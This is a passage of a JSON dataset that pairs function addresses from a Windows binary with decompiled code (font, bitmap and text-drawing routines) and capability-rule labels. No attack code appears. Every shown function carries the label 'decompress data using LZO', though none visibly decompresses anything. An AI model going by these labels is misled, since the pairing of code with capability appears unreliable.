{\n        fcn.00419dfc();\n    }\n    *in_FS_OFFSET = iStack76;\n    *in_FS_OFFSET = iStack64;\n    *in_FS_OFFSET = iStack52;\n    puStack44 = 0x419c4f;\n    uStack48 = 0x419c47;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 766
    },
    "0041b1ac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b1ac(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    \n    bVar1 = *0x10 == 0x14;\n    fcn.004051b0();\n    if (bVar1) {\n        if (param_2 != 0) {\n            param_2 = *(param_2 + -4);\n        }\n        if (param_2 < 0x100) {\n            fcn.0041b2ac();\n            fcn.0041b0b0();\n        }\n        else {\n            fcn.0041b2ac();\n            fcn.0041b0b0();\n        }\n        fcn.0041b0b0();\n    }\n    else {\n        fcn.0041b2ac();\n        fcn.0041b0b0();\n        fcn.0041b0b0();\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "00420c58": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00420d49)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00420c58(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint *puStackY148;\n    int32_t iStack120;\n    uint uStack116;\n    uchar *puStack112;\n    int32_t iStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uint var_24h;\n    int32_t var_4h;\n    \n    puStack100 = &stack0xfffffffc;\n    uStack104 = 0x420e74;\n    iStack108 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    var_4h = *(in_EAX + 0x10);\n    if (*(var_4h + 8) != 0) {\n        *in_FS_OFFSET = iStack108;\n        puStack100 = 0x420e7b;\n        uStack104 = 0x420e73;\n        fcn.00404dc4();\n        return;\n    }\n    puStack112 = 0x420c9c;\n    fcn.0041ff38();\n    uStack116 = 0x420e4c;\n    iStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &stack0xfffffffc;\n    if (*(var_4h + 8) == 0) {\n        var_40h = *(var_4h + 0x14);\n        var_3ch = 0;\n        var_38h = *(var_4h + 0x18);\n        if ((*(var_4h + 0x1d) & 1) == 0) {\n            var_30h = 400;\n        }\n        else {\n            var_30h = 700;\n        }\n        var_2ch._0_1_ = (*(var_4h + 0x1d) & 2) != 0;\n        var_2ch._1_1_ = (*(var_4h + 0x1d) & 4) != 0;\n        var_2ch._2_1_ = (*(var_4h + 0x1d) & 8) != 0;\n        var_2ch._3_1_ = *(var_4h + 0x1e);\n        if ((var_2ch._3_1_ == '\\x01') && (*0x490b42 != '\\x01')) {\n            var_2ch._3_1_ = *0x490b42;\n        }\n        puStack112 = &stack0xfffffffc;\n        var_34h = var_38h;\n        fcn.00405004();\n        uVar2 = fcn.00405264(*0x420e88);\n        fcn.00405004(0, uVar2);\n        uVar2 = fcn.00405264();\n        iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n        if (iVar3 == 2) {\n            fcn.00405004();\n            fcn.00409610();\n        }\n        else {\n            fcn.00405004();\n            fcn.00409610();\n        }\n        if (((**0x492cfc == 1) && (cVar1 = fcn.004280f8(),  cVar1 == -0x80)) && (cVar1 = fcn.00420c2c(),  cVar1 != '\\0')\n           ) {\n            var_2ch._3_1_ = -0x80;\n        }\n        var_26h = 0;\n        if (var_34h == 0) {\n            var_28h = 0;\n        }\n        else {\n            var_28h = 7;\n        }\n        var_27h = 0;\n        cVar1 = fcn.00420fd0();\n        if (cVar1 == '\\x01') {\n            var_25h = 2;\n        }\n        else if (cVar1 == '\\x02') {\n            var_25h = 1;\n        }\n        else {\n            var_25h = 0;\n        }\n        puStackY148 = &fcn.00420c58::var_40h;\n        uVar2 = sub.gdi32.dll_CreateFontIndirectA();\n        *(var_4h + 8) = uVar2;\n    }\n    *in_FS_OFFSET = puStackY148;\n    fcn.0041ff44(0x420e53);\n    return;\n}\n",
        "token_count": 1152
    },
    "00421a78": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421a78(uint *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    fcn.00421d68();\n    *param_1 = 0;\n    param_1[1] = 0;\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    uVar1 = fcn.00405264(param_2, param_1);\n    sub.gdi32.dll_GetTextExtentPoint32A(*(in_EAX + 4), uVar1);\n    return;\n}\n",
        "token_count": 142
    },
    "00422200": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.00422200(void)\n\n{\n    int16_t in_AX;\n    \n    if (((in_AX != 1) && (in_AX != 4)) && (in_AX != 8)) {\n        return 0;\n    }\n    return 1 << (in_AX & 0x1f);\n}\n",
        "token_count": 70
    },
    "004266d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.004266d0(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    \n    uVar4 = 8;\n    cVar3 = fcn.00426650();\n    if (cVar3 == '\\x01') {\n        uVar4 = 0;\n    }\n    else {\n        iVar2 = *(in_EAX + 0x28);\n        uVar1 = *(iVar2 + 0x3e);\n        if (uVar1 < 0x11) {\n            if (uVar1 == 0x10) {\n                if (*(iVar2 + 0x40) == 0) {\n                    uVar4 = 4;\n                }\n                else if ((*(iVar2 + 0x40) == 3) && (*(iVar2 + 0x5c) == 0x7e0)) {\n                    uVar4 = 5;\n                }\n            }\n            else if (uVar1 == 1) {\n                uVar4 = 1;\n            }\n            else if (uVar1 == 4) {\n                uVar4 = 2;\n            }\n            else if (uVar1 == 8) {\n                uVar4 = 3;\n            }\n        }\n        else if (uVar1 == 0x18) {\n            uVar4 = 6;\n        }\n        else if ((uVar1 == 0x20) && (*(iVar2 + 0x40) == 0)) {\n            uVar4 = 7;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 362
    },
    "00426c78": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00426c78(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    bool bVar5;\n    uint uVar6;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uchar *puStack256;\n    uint uStack252;\n    int32_t *piStack248;\n    uint uStack244;\n    uint *puStack240;\n    uint uStack236;\n    uchar *puStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack212;\n    uint uStack208;\n    uchar *puStack204;\n    uint uStack200;\n    uint uStack196;\n    uchar *puStack192;\n    uint var_aah;\n    uint var_48h;\n    uint var_44h;\n    ushort var_40h;\n    ushort var_3eh;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint hpal;\n    uint hgdiobj;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint lpbmih;\n    int32_t lpbInit;\n    uint var_10h;\n    uint hdc;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack204 = &stack0xfffffffc;\n    puStack192 = 0x426cab;\n    var_8h = in_EDX;\n    (**(*in_EDX + 0xc))();\n    bVar5 = var_20h == 0xc;\n    if (bVar5) {\n        var_20h = 0x28;\n    }\n    puStack192 = 0x426cd0;\n    piVar1 = fcn.00402ce4();\n    uStack196 = 0x427199;\n    uStack200 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff38;\n    uStack208 = 0x42716c;\n    uStack212 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff2c;\n    if (bVar5) {\n        puStack204 = &stack0xfffffffc;\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        fcn.00403720();\n        piVar1[1] = var_44h;\n        piVar1[2] = var_44h._2_2_;\n        *(piVar1 + 3) = var_40h;\n        *(piVar1 + 0xe) = var_3eh;\n    }\n    else {\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        if ((piVar1[4] != 3) && (piVar1[4] != 0)) {\n            var_8h = fcn.00403f28();\n            if (arg_8h == 0) {\n                fcn.00403720();\n            }\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            uStack224 = 0x426dfe;\n            fcn.004177cc(in_ECX - var_20h, 0);\n            uStack224 = 0x426e0e;\n            (**(*var_8h + 0x14))();\n        }\n    }\n    *piVar1 = var_20h;\n    if (*(piVar1 + 3) != 1) {\n        fcn.00421f70();\n    }\n    if ((var_20h == 0x28) && (((*(piVar1 + 0xe) == 0x10 || (*(piVar1 + 0xe) == 0x20)) && (piVar1[4] == 3)))) {\n        fcn.0041775c();\n    }\n    if (piVar1[8] == 0) {\n        iVar2 = fcn.00422200();\n        piVar1[8] = iVar2;\n    }\n    fcn.0041775c();\n    if ((piVar1[5] == 0) || (piVar1[4] == 0)) {\n        iVar2 = fcn.00422220();\n        uVar4 = piVar1[2] >> 0x1f;\n        piVar1[5] = iVar2 * ((piVar1[2] ^ uVar4) - uVar4);\n    }\n    if (bVar5) {\n        fcn.004224cc();\n    }\n    sub.user32.dll_GetDC();\n    uStack252 = fcn.00422090();\n    uStack224 = 0x4270e7;\n    uStack228 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff1c;\n    hdc = uStack252;\n    if (((piVar1[4] == 0) || (piVar1[4] == 3)) && (*0x490b64 == '\\0')) {\n        puStack232 = NULL;\n        uStack236 = 0;\n        puStack240 = &fcn.00426c78::lpbInit;\n        uStack244 = 0;\n        puStack256 = 0x42706d;\n        piStack248 = piVar1;\n        iVar2 = sub.gdi32.dll_CreateDIBSection();\n        if ((iVar2 == 0) || (lpbInit == 0)) {\n            puStack256 = 0x427081;\n            iVar2 = sub.kernel32.dll_GetLastError_1();\n            if (iVar2 == 0) {\n                puStack256 = 0x42708a;\n                fcn.00421f70();\n            }\n            else {\n                puStack256 = 0x427091;\n                fcn.0040db88();\n            }\n        }\n        uStack260 = 0x4270b6;\n        uStack264 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffef8;\n        uStack268 = 0x4270ac;\n        puStack256 = &stack0xfffffffc;\n        fcn.0041775c();\n        *in_FS_OFFSET = uStack264;\n        *in_FS_OFFSET = uStack252;\n        uStack244 = 0x4270ee;\n        piStack248 = hdc;\n        uStack252 = 0;\n        puStack256 = 0x4270e6;\n        sub.user32.dll_ReleaseDC();\n        return;\n    }\n    var_10h = 0;\n    puStack232 = 0x426f29;\n    lpbInit = fcn.00402ce4();\n    uStack236 = 0x42704f;\n    puStack240 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff10;\n    uStack244 = 0x426f47;\n    puStack232 = &stack0xfffffffc;\n    fcn.0041775c();\n    uStack244 = hdc;\n    piStack248 = 0x426f50;\n    sub.gdi32.dll_CreateCompatibleDC();\n    piStack248 = 0x426f55;\n    var_10h = fcn.00422090();\n    piStack248 = 0x1;\n    uStack252 = 1;\n    puStack256 = hdc;\n    uStack260 = 0x426f65;\n    uStack260 = sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack264 = var_10h;\n    uStack268 = 0x426f6f;\n    uVar3 = sub.gdi32.dll_SelectObject();\n    var_34h = 0;\n    if (piVar1[8] != 0) {\n        uStack268 = 0x426f8d;\n        uStack272 = fcn.00422788();\n        uStack268 = 0;\n        uStack276 = var_10h;\n        uStack280 = 0x426f9f;\n        var_34h = sub.gdi32.dll_SelectPalette();\n        uStack280 = var_10h;\n        puStack284 = 0x426fab;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack288 = 0x427023;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    uVar6 = var_10h;\n    puStack284 = &stack0xfffffffc;\n    iVar2 = sub.gdi32.dll_CreateDIBitmap(var_10h, piVar1, 4, lpbInit, piVar1, 0);\n    if (iVar2 == 0) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 == 0) {\n            fcn.00421f70();\n        }\n        else {\n            fcn.0040db88();\n        }\n    }\n    *in_FS_OFFSET = uVar6;\n    if (var_34h != 0) {\n        sub.gdi32.dll_SelectPalette(var_10h, var_34h, 0xffffffff, 0x42702a);\n    }\n    uVar3 = sub.gdi32.dll_SelectObject(var_10h, uVar3);\n    sub.gdi32.dll_DeleteObject(uVar3);\n    return;\n}\n",
        "token_count": 2146
    },
    "0042cb48": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2dh\n// WARNING: Variable defined which should be unmapped: var_29h\n// WARNING: Variable defined which should be unmapped: var_41h\n// WARNING: Variable defined which should be unmapped: var_3dh\n// WARNING: Variable defined which should be unmapped: var_21h\n// WARNING: Variable defined which should be unmapped: var_1dh\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0042cb48(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    uchar extraout_var;\n    uint unaff_ESI;\n    uint *puVar4;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint uStackY128;\n    uint32_t uStackY124;\n    uint uStackY120;\n    int32_t var_70h;\n    uint var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint *var_5ch;\n    uint *var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    int32_t iStackY80;\n    uint *puStackY76;\n    uchar auStackY72 [3];\n    uint var_41h;\n    uint var_3dh;\n    uchar uStack61;\n    uint *in_stack_ffffffc4;\n    uint var_31h;\n    uint var_2dh;\n    uint var_29h;\n    uint var_25h;\n    int32_t var_21h;\n    uint var_1dh;\n    uint32_t var_19h;\n    uint uStack25;\n    uint var_11h;\n    int32_t var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_1dh._1_1_ = 0xfc;\n    var_ch = 0x12;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_11h._0_1_ = unaff_ESI >> 0x18;\n    uStack25._0_1_ = unaff_EDI >> 0x18;\n    uStack25 = CONCAT31(unaff_ESI, uStack25);\n    var_1dh._2_2_ = &stack0xfffffffc >> 8;\n    var_19h._0_1_ = &stack0xfffffffc >> 0x18;\n    var_19h = CONCAT31(unaff_EDI, var_19h);\n    var_1dh._0_1_ = 0;\n    iVar1 = *in_FS_OFFSET;\n    var_25h._1_1_ = iVar1;\n    var_25h._2_2_ = iVar1 >> 8;\n    var_21h._0_1_ = iVar1 >> 0x18;\n    var_21h = CONCAT31(0x42cf27, var_21h);\n    *in_FS_OFFSET = &fcn.0042cb48::var_25h + 1;\n    var_29h._1_1_ = 0x7b;\n    var_29h._2_2_ = 0x42cb;\n    var_25h._0_1_ = 0;\n    fcn.00421b80();\n    var_29h._1_1_ = 0x80;\n    var_29h._2_2_ = 0x42cb;\n    var_25h._0_1_ = 0;\n    fcn.00437d14();\n    var_29h._1_1_ = 0x85;\n    var_29h._2_2_ = 0x42cb;\n    var_25h._0_1_ = 0;\n    cVar2 = fcn.00437e1c();\n    if (cVar2 == '\\0') {\n        var_29h._1_1_ = 0x20;\n        var_29h._2_2_ = 0x42cd;\n        var_25h._0_1_ = 0;\n        var_4h = fcn.00421adc();\n        iVar1 = in_EAX[0x13];\n        var_29h._1_1_ = iVar1;\n        var_29h._2_2_ = iVar1 >> 8;\n        var_25h._0_1_ = iVar1 >> 0x18;\n        var_2dh._1_1_ = SUB41(&fcn.0042cb48::var_21h, 0);\n        var_2dh._2_2_ = &fcn.0042cb48::var_21h >> 8;\n        var_29h._0_1_ = &fcn.0042cb48::var_21h >> 0x18;\n        var_31h._1_1_ = 0x40;\n        var_31h._2_2_ = 0x42cd;\n        var_2dh._0_1_ = 0;\n        fcn.00413a94(&fcn.0042cb48::var_21h, iVar1);\n        if (*(in_EAX + 0x1d9) == '\\0') {\n            var_31h._1_1_ = 0x8f;\n            var_31h._2_2_ = 0x42cd;\n            var_2dh._0_1_ = 0;\n            fcn.004214d4();\n        }\n        else {\n            var_21h = var_21h + 1;\n            iVar1 = CONCAT22(var_1dh._2_2_, CONCAT11(var_1dh._1_1_, var_1dh)) + 1;\n            var_1dh._0_1_ = iVar1;\n            var_1dh._1_1_ = iVar1 >> 8;\n            var_1dh._2_2_ = iVar1 >> 0x10;\n            var_31h._1_1_ = 0x5c;\n            var_31h._2_2_ = 0x42cd;\n            var_2dh._0_1_ = 0;\n            fcn.004214d4();\n            var_31h._1_1_ = 0x66;\n            var_31h._2_2_ = 0x42cd;\n            var_2dh._0_1_ = 0;\n            fcn.004218b4();\n            var_31h._1_1_ = 0xff;\n            var_31h._2_2_ = 0xffff;\n            var_2dh._0_1_ = 0xff;\n            var_31h._0_1_ = 0xff;\n            in_stack_ffffffc4 = &fcn.0042cb48::var_21h;\n            var_3dh._1_1_ = 0x73;\n            var_3dh._2_2_ = 0x42cd;\n            uStack61 = 0;\n            sub.user32.dll_OffsetRect();\n            var_3dh._1_1_ = 0x80;\n            var_3dh._2_2_ = 0x42cd;\n            uStack61 = 0;\n            fcn.004214d4();\n        }\n        var_3dh._1_1_ = 0x99;\n        var_3dh._2_2_ = 0x42cd;\n        uStack61 = 0;\n        fcn.004218b4();\n        var_3dh._1_1_ = 0xa3;\n        var_3dh._2_2_ = 0x42cd;\n        uStack61 = 0;\n        fcn.004455ac();\n        if (var_70h != 0) {\n            var_3dh._1_1_ = 0xb8;\n            var_3dh._2_2_ = 0x42cd;\n            uStack61 = 0;\n            cVar2 = fcn.00404154();\n            var_3dh._1_1_ = var_4h;\n            uStack61 = var_4h >> 0x18;\n            var_3dh._2_2_ = var_4h >> 8;\n            if (cVar2 == '\\0') {\n                var_41h._1_1_ = SUB41(&fcn.0042cb48::var_21h, 0);\n                var_41h._2_2_ = &fcn.0042cb48::var_21h >> 8;\n                var_3dh._0_1_ = &fcn.0042cb48::var_21h >> 0x18;\n                _auStackY72 = 0x42cdd2;\n                fcn.00413a94(&fcn.0042cb48::var_21h, var_4h);\n            }\n            else {\n                var_41h._1_1_ = SUB41(&fcn.0042cb48::var_80h, 0);\n                var_41h._2_2_ = &fcn.0042cb48::var_80h >> 8;\n                var_3dh._0_1_ = &fcn.0042cb48::var_80h >> 0x18;\n                _auStackY72 = 0x42cde9;\n                fcn.004455ac();\n                _auStackY72 = 0x42cdfa;\n                fcn.00421ac0();\n                _auStackY72 = 0x42ce0d;\n                fcn.00413a94(CONCAT13(var_3dh, CONCAT21(var_41h._2_2_, var_41h._1_1_)), \n                             CONCAT13(uStack61, CONCAT21(var_3dh._2_2_, var_3dh._1_1_)));\n                var_21h = var_80h;\n                var_1dh._0_1_ = uStackY128;\n                var_1dh._1_1_ = uStackY128 >> 8;\n                var_1dh._2_2_ = uStackY128 >> 0x10;\n                var_19h = uStackY124;\n                uStack25 = uStackY120;\n            }\n            _auStackY72 = 0x42ce25;\n            var_8h = fcn.00447efc();\n            _auStackY72 = 0x42ce35;\n            fcn.004455ac();\n            if (var_88h != 0) {\n                var_88h = *(var_88h + -4);\n            }\n            _auStackY72 = var_8h | 0x400;\n            puStackY76 = &fcn.0042cb48::var_21h;\n            var_50h = 0x42ce65;\n            iStackY80 = var_88h;\n            fcn.004455ac();\n            var_50h = 0x42ce70;\n            var_50h = fcn.00405264();\n            var_54h = 0x42ce78;\n            var_54h = fcn.00421c8c();\n            var_58h = 0x42ce7e;\n            sub.user32.dll_DrawTextA();\n            var_58h = 0x42ce89;\n            fcn.004214d4();\n            var_58h = 0x42ce96;\n            fcn.004455ac();\n            if (var_90h != 0) {\n                var_90h = *(var_90h + -4);\n            }\n            var_58h = var_8h;\n            var_5ch = &fcn.0042cb48::var_21h;\n            var_64h = 0x42cec1;\n            var_60h = var_90h;\n            fcn.004455ac();\n            var_64h = 0x42cecc;\n            var_64h = fcn.00405264();\n            var_68h = 0x42ced4;\n            var_68h = fcn.00421c8c();\n            var_6ch = 0x42ceda;\n            sub.user32.dll_DrawTextA();\n        }\n    }\n    else {\n        var_29h._1_1_ = 0x97;\n        var_29h._2_2_ = 0x42cb;\n        var_25h._0_1_ = 0;\n        fcn.004455ac();\n        if (var_54h == 0) {\n            var_29h._1_1_ = 0;\n            var_29h._2_2_ = 0;\n            var_25h._0_1_ = 0;\n            var_2dh._1_1_ = SUB41(&fcn.0042cb48::var_31h, 0);\n            var_2dh._2_2_ = &fcn.0042cb48::var_31h >> 8;\n            var_29h._0_1_ = &fcn.0042cb48::var_31h >> 0x18;\n            var_31h._1_1_ = 0x3c;\n            var_31h._2_2_ = 0x42cc;\n            var_2dh._0_1_ = 0;\n            fcn.00413a94(&fcn.0042cb48::var_31h, 0);\n        }\n        else {\n            var_29h._1_1_ = 0xab;\n            var_29h._2_2_ = 0x42cb;\n            var_25h._0_1_ = 0;\n            fcn.004455ac();\n            var_5ch = var_58h;\n            puVar4 = var_58h;\n            if (var_58h != NULL) {\n                puVar4 = var_58h[-1];\n            }\n            iVar1 = &fcn.0042cb48::var_11h + 1;\n            var_29h._1_1_ = iVar1;\n            var_29h._2_2_ = iVar1 >> 8;\n            var_25h._0_1_ = iVar1 >> 0x18;\n            var_2dh._1_1_ = SUB41(puVar4, 0);\n            var_2dh._2_2_ = puVar4 >> 8;\n            var_29h._0_1_ = puVar4 >> 0x18;\n            var_31h._1_1_ = 0xcc;\n            var_31h._2_2_ = 0x42cb;\n            var_2dh._0_1_ = 0;\n            fcn.004455ac();\n            var_31h._1_1_ = 0xd4;\n            var_31h._2_2_ = 0x42cb;\n            var_2dh._0_1_ = 0;\n            uVar3 = fcn.00405264();\n            var_31h._1_1_ = uVar3;\n            var_31h._2_2_ = uVar3 >> 8;\n            var_2dh._0_1_ = uVar3 >> 0x18;\n            var_31h._0_1_ = 0;\n            fcn.00421c8c();\n            var_31h._0_1_ = extraout_var;\n            sub.gdi32.dll_GetTextExtentPoint32A();\n            var_3dh._1_1_ = SUB41(&fcn.0042cb48::var_31h, 0);\n            var_3dh._2_2_ = &fcn.0042cb48::var_31h >> 8;\n            uStack61 = &fcn.0042cb48::var_31h >> 0x18;\n            var_41h._1_1_ = 0xf6;\n            var_41h._2_2_ = 0x42cb;\n            var_3dh._0_1_ = 0;\n            fcn.00413a94(&fcn.0042cb48::var_31h, var_ch);\n            var_41h._1_1_ = 1;\n            var_41h._2_2_ = 0x42cc;\n            var_3dh._0_1_ = 0;\n            cVar2 = fcn.00404154();\n            if (cVar2 == '\\0') {\n                var_41h._1_1_ = 0;\n                var_41h._2_2_ = 0;\n                var_3dh._0_1_ = 0;\n                _auStackY72 = 8;\n                puStackY76 = &fcn.0042cb48::var_31h;\n                iStackY80 = 0x42cc12;\n                sub.user32.dll_OffsetRect();\n            }\n            else {\n                var_41h._1_1_ = 0;\n                var_41h._2_2_ = 0;\n                var_3dh._0_1_ = 0;\n                _auStackY72 = (in_EAX[0x12] + -8) - CONCAT22(var_29h._2_2_, CONCAT11(var_29h._1_1_, var_29h));\n                puStackY76 = &fcn.0042cb48::var_31h;\n                iStackY80 = 0x42cc29;\n                sub.user32.dll_OffsetRect();\n            }\n        }\n        var_31h._1_1_ = 0x46;\n        var_31h._2_2_ = 0x42cc;\n        var_2dh._0_1_ = 0;\n        (**(*in_EAX + 0x44))();\n        var_31h._1_1_ = var_25h;\n        var_31h._2_2_ = CONCAT22(var_25h._2_2_, CONCAT11(var_25h._1_1_, var_25h)) >> 8;\n        var_2dh._0_1_ = var_25h._2_2_ >> 8;\n        var_31h._0_1_ = var_29h._2_2_ >> 8;\n        var_3dh._1_1_ = var_31h;\n        var_3dh._2_2_ = CONCAT22(var_31h._2_2_, CONCAT11(var_25h, var_31h)) >> 8;\n        uStack61 = var_25h._2_2_;\n        var_41h._1_1_ = 0x6d;\n        var_41h._2_2_ = 0x42cc;\n        var_3dh._0_1_ = 0;\n        uVar3 = fcn.00421c8c();\n        var_41h._1_1_ = uVar3;\n        var_41h._2_2_ = uVar3 >> 8;\n        var_3dh._0_1_ = uVar3 >> 0x18;\n        _auStackY72 = 0x42cc73;\n        sub.gdi32.dll_ExcludeClipRect();\n        _auStackY72 = 0x42cc7a;\n        cVar2 = (**(*in_EAX + 0x50))();\n        if (cVar2 == '\\0') {\n            var_11h._0_1_ = 0x1c;\n        }\n        else {\n            var_11h._0_1_ = 0x1b;\n        }\n        var_1dh._1_1_ = 0x8d;\n        var_1dh._2_2_ = 0x42cc;\n        var_19h = var_19h & 0xffffff00;\n        fcn.00437d14();\n        var_1dh._1_1_ = 0x99;\n        var_1dh._2_2_ = 0x42cc;\n        var_19h = var_19h & 0xffffff00;\n        fcn.00438084();\n        var_1dh._1_1_ = SUB41(&fcn.0042cb48::var_41h, 0);\n        var_1dh._2_2_ = &fcn.0042cb48::var_41h >> 8;\n        var_19h = var_19h & 0xffffff00 | &fcn.0042cb48::var_41h >> 0x18;\n        var_1dh._0_1_ = 0;\n        var_25h._1_1_ = 0xa6;\n        var_25h._2_2_ = 0x42cc;\n        var_21h._1_3_ = 0;\n        var_21h._0_1_ = 0;\n        uVar3 = fcn.00421c8c();\n        var_25h._1_1_ = uVar3;\n        var_25h._2_2_ = uVar3 >> 8;\n        var_21h._0_1_ = uVar3 >> 0x18;\n        var_29h._1_1_ = 0xac;\n        var_29h._2_2_ = 0x42cc;\n        var_25h._0_1_ = 0;\n        fcn.00437d14();\n        var_25h._1_1_ = 0xb5;\n        var_25h._2_2_ = 0x42cc;\n        var_21h._0_1_ = 0;\n        fcn.00437f28(CONCAT13(var_1dh, var_21h._1_3_), CONCAT13(var_19h, CONCAT21(var_1dh._2_2_, var_1dh._1_1_)));\n        var_25h._1_1_ = 0;\n        var_25h._2_2_ = 0;\n        var_21h = var_21h._1_3_ << 8;\n        var_29h._1_1_ = 0xbe;\n        var_29h._2_2_ = 0x42cc;\n        var_25h._0_1_ = 0;\n        in_stack_ffffffc4 = fcn.00421c8c();\n        var_2dh._1_1_ = 0xc4;\n        var_2dh._2_2_ = 0x42cc;\n        var_29h._0_1_ = 0;\n        sub.gdi32.dll_SelectClipRgn();\n        var_2dh._1_1_ = 0xce;\n        var_2dh._2_2_ = 0x42cc;\n        var_29h._0_1_ = 0;\n        fcn.004455ac();\n        if (var_64h != 0) {\n            var_2dh._1_1_ = 0xe2;\n            var_2dh._2_2_ = 0x42cc;\n            var_29h._0_1_ = 0;\n            fcn.004455ac();\n            var_2dh._1_1_ = 0xed;\n            var_2dh._2_2_ = 0x42cc;\n            var_29h._0_1_ = 0;\n            fcn.004056d0();\n            var_2dh._1_1_ = var_68h;\n            var_2dh._2_2_ = var_68h >> 8;\n            var_29h._0_1_ = var_68h >> 0x18;\n            var_31h._1_1_ = SUB41(&fcn.0042cb48::var_31h, 0);\n            var_31h._2_2_ = &fcn.0042cb48::var_31h >> 8;\n            var_2dh._0_1_ = &fcn.0042cb48::var_31h >> 0x18;\n            var_31h._0_1_ = 0;\n            in_stack_ffffffc4 = NULL;\n            var_3dh._1_1_ = 0;\n            var_3dh._2_2_ = 0x42cd;\n            uStack61 = 0;\n            uVar3 = fcn.00421c8c();\n            var_3dh._1_1_ = uVar3;\n            var_3dh._2_2_ = uVar3 >> 8;\n            uStack61 = uVar3 >> 0x18;\n            var_41h._1_1_ = 6;\n            var_41h._2_2_ = 0x42cd;\n            var_3dh._0_1_ = 0;\n            fcn.00437d14();\n            var_3dh._1_1_ = 0xf;\n            var_3dh._2_2_ = 0x42cd;\n            uStack61 = 0;\n            fcn.0043801c(in_stack_ffffffc4, var_31h << 0x18, CONCAT13(var_2dh, CONCAT21(var_31h._2_2_, var_31h._1_1_)), \n                         CONCAT13(var_29h, CONCAT21(var_2dh._2_2_, var_2dh._1_1_)));\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    var_31h._1_1_ = 0x2e;\n    var_31h._2_2_ = 0x42cf;\n    var_2dh._0_1_ = 0;\n    var_31h._0_1_ = 0;\n    fcn.00404dc4();\n    var_31h._0_1_ = 0;\n    fcn.00404dc4();\n    var_31h._0_1_ = 0;\n    fcn.00405580();\n    var_31h._0_1_ = 0;\n    fcn.00404dc4();\n    var_31h._0_1_ = 0;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 5925
    },
    "0042d0c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
